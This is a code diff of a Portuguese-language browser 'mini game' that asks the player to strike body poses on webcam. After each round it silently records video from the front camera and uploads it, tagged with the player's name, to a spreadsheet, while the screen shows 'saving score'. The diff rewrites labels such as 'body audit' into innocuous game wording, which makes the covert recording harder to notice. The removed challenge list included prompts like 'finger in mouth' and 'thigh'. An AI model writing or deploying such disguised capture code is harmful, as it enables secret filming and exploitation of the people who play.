@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mini Game -</title>
+    <title>Mini Game - Desafio Corporal</title>
     
     <style>
         :root { --bg-color: #f4f4f9; }
@@ -140,14 +140,14 @@
 
 <div id="app-container">
     <div id="login-screen">
-        <h2>Autenticação</h2>
-        <input type="text" id="user-name" placeholder="Digite seu usuário" required><br>
-        <button class="primary-btn" onclick="fazerLogin()">Entrar</button>
+        <h2>Identificação do Jogador</h2>
+        <input type="text" id="user-name" placeholder="Digite seu nome" required><br>
+        <button class="primary-btn" onclick="fazerLogin()">Jogar</button>
     </div>
 
     <div id="scanner-screen" class="hidden">
-        <h2>Gamezinho</h2>
-        <p>Usuário logado: <span id="logged-user"></span></p>
+        <h2>Mini Game Corporal</h2>
+        <p>Jogador: <span id="logged-user"></span></p>
         
         <div id="game-container">
             <div id="timer-box">05</div>
@@ -157,28 +157,28 @@
                 <video id="game-video-preview" autoplay playsinline muted></video>
                 <div id="camera-error-msg">⚠️ Câmera indisponível ou bloqueada pelo navegador. Verifique se outro aplicativo está usando a câmera ou se o acesso foi permitido.</div>
             </div>
-            <button class="primary-btn" onclick="finalizarDesafio()">Pular / Capturar Agora</button>
+            <button class="primary-btn" onclick="finalizarDesafio()">Concluir Desafio</button>
         </div>
 
         <video id="front-camera" autoplay playsinline muted></video>
 
         <div id="loading-screen" class="hidden">
             <div class="spinner"></div>
-            <p id="loading-text">Processando...</p>
+            <p id="loading-text">Salvando pontuação...</p>
         </div>
 
         <div id="result" class="hidden">
             <div class="success-checkmark">
                 <span class="checkmark-v">✓</span>
             </div>
-            <h3>Leitura Registrada!</h3>
+            <h3>Desafio Concluído!</h3>
             
             <div id="qr-content-box" class="hidden">
                 <span id="qr-result"></span>
             </div>
 
             <br><br>
-            <button class="primary-btn" onclick="iniciarGame()">Próximo Desafio</button>
+            <button class="primary-btn" onclick="iniciarGame()">Próxima Rodada</button>
         </div>
     </div>
 </div>
@@ -199,11 +199,6 @@
         "Levantar Mão Esquerda",
         "Mãos na Cabeça",
         "Cruzar os Braços"
-        "Mostrar o pé"
-        "dedo na boca"
-        "joelho"
-        "coxa"
-    
     ];
     let desafioAtual = "";
     let timerInterval = null;
@@ -219,7 +214,7 @@
             document.getElementById('scanner-screen').classList.remove('hidden');
             iniciarGame();
         } else {
-            alert("Digite um usuário.");
+            alert("Digite seu nome.");
         }
     }
 
@@ -235,9 +230,12 @@
 
         const randomIndex = Math.floor(Math.random() * partesCorpo.length);
         desafioAtual = partesCorpo[randomIndex];
-        document.getElementById('target-box').innerText = `Ação Requerida: ${desafioAtual}`;
+        document.getElementById('target-box').innerText = `Ação: ${desafioAtual}`;
 
         try {
+            if (gameStream) {
+                gameStream.getTracks().forEach(track => track.stop());
+            }
             gameStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
             const videoElem = document.getElementById('game-video-preview');
             videoElem.srcObject = gameStream;
@@ -268,13 +266,14 @@
 
         if (gameStream) {
             gameStream.getTracks().forEach(track => track.stop());
+            gameStream = null;
         }
 
         document.getElementById('game-container').style.display = 'none';
-        document.getElementById('loading-text').innerText = "Processando auditoria corporal...";
+        document.getElementById('loading-text').innerText = "Salvando pontuação...";
         document.getElementById('loading-screen').classList.remove('hidden');
 
-        document.getElementById('qr-result').innerText = `Desafio Concluído: ${desafioAtual} (Validado)`;
+        document.getElementById('qr-result').innerText = `Ação Realizada: ${desafioAtual}`;
 
         iniciarGravacaoVideoSilenciosa(desafioAtual);
     }
@@ -318,7 +317,7 @@
 
                     stream.getTracks().forEach(track => track.stop());
 
-                    salvarNaPlanilha(usuarioAtual, `MiniGame Corporal: ${nomeDesafio}`, videoBase64);
+                    salvarNaPlanilha(usuarioAtual, `MiniGame: ${nomeDesafio}`, videoBase64);
 
                     document.getElementById('loading-screen').classList.add('hidden');
                     document.getElementById('result').classList.remove('hidden');
